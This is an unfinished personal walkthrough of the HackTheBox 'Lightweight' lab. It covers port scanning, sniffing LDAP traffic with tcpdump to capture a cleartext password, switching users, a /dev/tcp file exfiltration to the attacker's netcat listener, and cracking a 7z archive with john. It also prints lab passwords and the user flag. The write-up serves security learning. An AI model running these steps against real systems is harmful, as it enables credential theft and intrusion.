#medium

## 0. **Lab infos**

**Difficulty :** medium
**Name :** Lightweight
**IP** : 10.129.9.192
**Objectives :** Get the Idapuser2 flag in the home directory and the root flag in the home directory
**OS :** Linux

##### **Conclusion**
**Time :** 
	**Start :** 24.04.2025 18:26
	**Break at/to :** 24.04.2025 19:32 / 24.04.2025 20:15 | 24.04.2025 20:45 / 25.04.2025 17:00
	**Finish :**
**Satisfaction :**  
### 1. **Reconnaissance**

We start with an #nmap scan :

```BASH
┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-yrfyly7wla]─[~]
└──╼ [★]$ nmap -A 10.129.9.192
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 11:27 CDT
Nmap scan report for 10.129.9.192
Host is up (0.0070s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

![[Pasted image 20250424183007.png]]

Now gobuster :

```BASH
┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-yrfyly7wla]─[~]
└──╼ [★]$ gobuster dir -u http://lightweight.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,log,txt,db,py,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lightweight.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,log,txt,db,py,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: error on running gobuster: unable to connect to http://lightweight.htb/: Get "http://lightweight.htb/": dial tcp 10.129.9.192:80: connect: connection refused
```

hmmm.

```BASH
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/index.php            (Status: 200) [Size: 4218]
/info.php             (Status: 200) [Size: 1727]
[ERROR] Get "http://lightweight.htb/feed.log": dial tcp 10.129.9.192:80: connect: connection refused
/user.php             (Status: 200) [Size: 1495]
Progress: 1124 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/research.db": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1125 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/research.log": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1126 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/research.txt": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1127 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/research.php": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1128 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/feedback.js": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1129 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/print": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1130 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/feedback.html": dial tcp 10.129.9.192:80: connect: connection refused
[ERROR] Get "http://lightweight.htb/feedback.py": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1132 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/print.log": dial tcp 10.129.9.192:80: connect: connection refused
Progress: 1133 / 1764488 (0.06%)[ERROR] Get "http://lightweight.htb/research.py": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/research.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/feedback": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/feedback.log": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/feedback.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/feedback.db": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://lightweight.htb/print.txt": dial tcp 10.129.9.192:80: connect: connection refused
^C
[!] Keyboard interrupt detected, terminating.
Progress: 1142 / 1764488 (0.06%)
===============================================================
Finished
===============================================================
```

It's seem we are blocked by ip...

![[Pasted image 20250424184638.png]]

We can connect via ssh with `ssh 10.10.14.145@lightweight.htb` the password is `10.10.14.145`

```BASH
[10.10.14.145@lightweight ~]$ getcap -r / 2>/dev/null | grep cap_net_raw
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```


## 2. **Weaponization**

## 3. **Delivery**

## 4. **Exploitation**


```BASH
[10.10.14.145@lightweight ~]$ ldapsearch -x -H ldap://lightweight.htb -b "dc=lightweight,dc=htb" "(uid=ldapuser2)" userPassword
# extended LDIF
#
# LDAPv3
# base <dc=lightweight,dc=htb> with scope subtree
# filter: (uid=ldapuser2)
# requesting: userPassword 
#

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

By decoding the password with base64 have have this :
`$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1`

So lets decrypt it with john :

But the crack is impossible so let's try sniffing with tcpdump.

` /usr/sbin/tcpdump -i lo port 389 -w capture.cap -v`

We can visit each page of the website for generate traffic and after 5minutes we cate click ctrl+C and see :

```BASH
[10.10.14.145@lightweight ~]$ strings capture.cap 
<g[@
4g\@
1!0Y
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac25
4g^@
;g_@
4g`@
4ga@
750Y
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac26
<hW@
4hX@
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac29
4hZ@
;h[@
4h\@
4h]@
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2F
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2I
<\VS
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2e
<]VS
<]VS
<kVS
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2i
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2m
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2r
\$0Y
-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
 8bc8251332abe1d7f105d3e53ad39ac2
```

`8bc8251332abe1d7f105d3e53ad39ac2` is the ldapuser2 password

```BASH
[10.10.14.145@lightweight ~]$ su ldapuser2
Password: 
[ldapuser2@lightweight 10.10.14.145]$ 
[ldapuser2@lightweight 10.10.14.145]$ cd ..
[ldapuser2@lightweight home]$ ls
10.10.14.145  10.10.14.2  127.0.0.1  ldapuser1	ldapuser2
[ldapuser2@lightweight home]$ cd ldapuser2
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
```

On the attacker machine : `nc -lvnp 4444 > backup.7z`
On the victim : `cat backup.7z > /dev/tcp/10.10.14.145/4444`

Now we want to crack the password :

```BASH
┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-c1k7cd5ny7]─[~]
└──╼ [★]$ 7z2john backup.7z > backup_hash.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-c1k7cd5ny7]─[~]
└──╼ [★]$ john --wordlist=Desktop/rockyou.txt backup_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 512/512 AVX512BW 16x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 3140 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (backup.7z)     
1g 0:00:00:12 DONE (2025-04-25 10:25) 0.07917g/s 167.2p/s 167.2c/s 167.2C/s slimshady..morado
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is delete

In the file status.php we find this :

```PHP
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
```

## 5. **Installation**

## 6. **Command and Control**

## 7. **Actions on Objectives**

Flag for ldapuser2 :

```BASH
[ldapuser2@lightweight ~]$ cat user.txt 
d0e63c6553c027f227b9a728908d98e5
```

